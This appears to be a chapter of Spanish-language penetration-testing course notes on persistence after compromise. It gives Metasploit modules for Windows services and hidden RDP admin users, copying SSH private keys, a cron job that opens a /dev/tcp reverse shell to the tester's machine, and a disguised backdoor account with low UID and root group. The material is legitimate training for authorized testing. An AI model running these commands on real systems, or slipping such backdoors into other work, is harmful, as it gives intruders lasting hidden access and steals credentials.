# Persistencia

La persistencia consiste en técnicas usadas para mantener el acceso a un sistema a pesar de los reinicios, cambios de credenciales y otras interrupciones que puedan afectar al acceso. Estas técnicas incluyen cualquier acceso, acción o cambio de configuración que permita mantener un punto de apoyo en el sistema. Pueden ser reemplazar o secuestrar (hijacking) código legítimo.

Hijacking significa alterar el flujo normal de ejecución de un programa legítimo para que el sistema ejecute el código del atacante de forma automática y repetitiva.

## Persistencia en Windows

En Windows, la persistencia puede conseguirse mediante distintos mecanismos que permiten mantener el acceso al sistema después de reinicios o interrupciones de la sesión inicial. A continuación, se presentan algunas de las técnicas más habituales, centradas en servicios y en el acceso mediante RDP.

### Persistencia mediante servicios

Para esta técnica podemos usar el módulo `persistence_service` de metasploit (`exploit/windows/persistence/service` en versiones recientes). Su funcionamiento consiste en los siguientes pasos:

1. Generar un ejecutable (payload).
2. Cargar un ejecutable en el sistema objetivo.
3. Crear un servicio persistente. 
4. Este servicio ejecuta el payload cada vez que se encuentra activo.

```bash
msf > use exploit/windows/persistence/service
[*] Using configured payload windows/meterpreter/reverse_tcp
msf exploit(windows/persistence/service) > set lport <puerto> # debe ser distinto a la sesión actual
msf exploit(windows/persistence/service) > set session <id>
# lo siguiente no es necesario para la ejecución, pero permite 
# ocultar el servicio si le damos el nombre de un servicio común en windows
msf exploit(windows/persistence/service) > set service_name <nombre>
msf exploit(windows/persistence/service) > exploit
```

Una vez creado el servicio, podemos establecer una sesión en cualquier momento sin necesidad de volver a explotar el sistema. es necesario configurar las mismas opciones que en el payload y no lo es especificar el objetivo.

```bash
msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost <ip>
msf exploit(multi/handler) > set lport <puerto>
msf exploit(multi/handler) > exploit
```

### Persistencia vía RDP

En este tipo de persistencia se modifican archivos y configuraciones del sistema al crear un nuevo usuario, por lo que es necesario tener consentimiento explícito y definir el alcance.

Para la persistencia vía RDP necesitamos una sesión estable, por lo que es recomendable migrar a [explorer](02_win_enum.md#Procesos-con-meterpreter).

Los pasos que debemos dar son:

1. Crear un usuario (necesitamos permisos de administrador).
2. Habilitar RDP si esta deshabilitado.
3. Ocultar el usuario en la pantalla de inicio de sesión de Windows.
4. Añadir el usuario al grupo de administradores y de RDP.

Este comando se encarga de ejecutar todos los pasos mencionados antes.

```bash
meterpreter > getgui -e -u <usr_name> -p <usr_pass>
```

Una vez creado el usuario deberiamos tener acceso gráfico al sistema usando:

```bash
usr@hostname:~# xfreerdp /u:usuario /p:contraseña /v:ip
```

También podemos hacerlo con el módulo `post/windows/manage/enable_rdp`:

```bash
msf > use post/windows/manage/enable_rdp
msf post(windows/manage/enable_rdp) > set session 1
msf post(windows/manage/enable_rdp) > set username usuario
msf post(windows/manage/enable_rdp) > set password contraseña
```

## Persistencia en Linux

En Linux existen diferentes mecanismos que pueden utilizarse para mantener el acceso a un sistema una vez obtenido un punto de apoyo inicial. Estas técnicas aprovechan funcionalidades propias del sistema operativo y requieren, dependiendo del método empleado, distintos niveles de privilegios.

### SSH Keys

Linux suele desplegarse como sistema operativo para servidores que normalmente se administran de forma remota mediante servicios o protocolos como SSH. Si SSH está habilitado y en ejecución en un sistema Linux que hemos comprometido, podemos aprovechar su configuración para establecer un acceso persistente.

En la mayoría de los casos, los servidores Linux tienen habilitada la autenticación mediante claves para el servicio SSH, lo que permite a los usuarios acceder al sistema Linux de forma remota sin necesidad de utilizar una contraseña. 

Después de obtener acceso a un sistema Linux, podemos transferir a nuestro sistema la clave privada SSH asociada a una cuenta de usuario específica y utilizarla para futuras autenticaciones y accesos. Habitualmente se encuentra en el directorio `~/.ssh/`.

```bash
usr@hostname:~# scp usr@ip:~/.ssh/key .
```

Para iniciar sesión con la clave que hemos obtenido usamos la opción `-i`.

```bash
usr@hostname:~# ssh -i key usr@ip
```

**Con metasploit:**

En este caso no copia las claves existentes, sino que las crea para los usuarios indicados, para todos si no se indica ninguno.

```bash
msf > use exploit/multi/persistence/ssh_key
[*] Using configured payload payload/generic/custom
msf exploit(multi/persistence/ssh_key) > set createsshfolder true
msf exploit(multi/persistence/ssh_key) > set session id
msf exploit(multi/persistence/ssh_key) > exploit
```

### Vía Cron Jobs

Linux implementa la programación de tareas mediante Cron, un servicio basado en el tiempo que ejecuta aplicaciones, scripts y otros comandos de forma repetitiva siguiendo una programación determinada.

Una aplicación o script que se ha configurado para ejecutarse repetidamente mediante Cron (Cron job) se puede usar para ejecutar un comando o script a intervalos determinados, con el objetivo de garantizar un acceso persistente al sistema objetivo.

Usando Cron, podemos programar una tarea que intente conectarse de forma periodica a nuestra máquina kali, creando una sesión bash al establecer la conexión.

```bash
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ip_kali/puerto_kali 0>&1'" > cron
crontab -i cron
```

- `/bin/bash -c '...'`: inicia Bash y le indica que ejecute el comando que está entre comillas.
`bash -i`: abre una instancia de Bash interactiva, necesaria para poder trabajar con ella como una terminal.
- `>& /dev/tcp/ip_kali/puerto_kali`: Bash utiliza /dev/tcp/ para abrir una conexión TCP hacia la IP y el puerto indicados. La salida estándar y la salida de error de la shell se redirigen a esa conexión.
- `0>&1`: redirige también la entrada estándar hacia el mismo canal, de modo que los comandos enviados desde el extremo remoto lleguen a la shell.

Para establecer una conexión a partir de este momento basta con crear un listener en nuestra máquina kali con `nc -nvlp puerto_kali` y esperar a que se ejecute el comando en el objetivo.

Esto se puede automatizar mediante **metasploit** con el módulo `exploit/multi/persistence/cron`, `cron_persistence` en versiones anteriores de `msfconsole`.

```bash
msf > use exploit/multi/persistence/cron 
[*] No payload configured, defaulting to cmd/linux/ftp/x64/meterpreter/reverse_tcp
msf exploit(multi/persistence/cron) > set session id
msf exploit(multi/persistence/cron) > run
```

### Creando un usuario

El usuario debería pasar lo más desapercibido posible, por lo que se pueden ajustar algunos parámetros para evitar reducir el riesgo de detección:

- Dar el nombre de un servicio: por ejemplo `FTP`.
- Directorio home legítimo: `/var/www-data`
- UID coherente:
	- **UID 0:** root.
	- **UID 1–99:** históricamente reservados para cuentas del sistema en muchas distribuciones, aunque los rangos exactos varían.
	- **UID 100–999:** frecuentemente cuentas de sistema/servicio en distribuciones modernas.
	- **UID ≥1000:** normalmente usuarios humanos/no sistema en muchas distribuciones actuales.

```console
usr@hostname# useradd -m -d /var/www -s /bin/bash www-data
usr@hostname# passwd www-data
usr@hostname# usermod -aG root www-data
usr@hostname# usermod -u 15 www-data
usr@hostname# groupmod -g 15 www-data 
```

La opción `-d` indica el directorio que se va a usar como home, y `-m` lo crea en caso de que no exista. Las opciones `-u` de `usermod` y `-g` de `groupmod` sirven para modificar el UID y GID respectivamente.

[⟵ Anterior](07_linux_privesc.md) | [Siguiente ⟶](09_winhash.md)

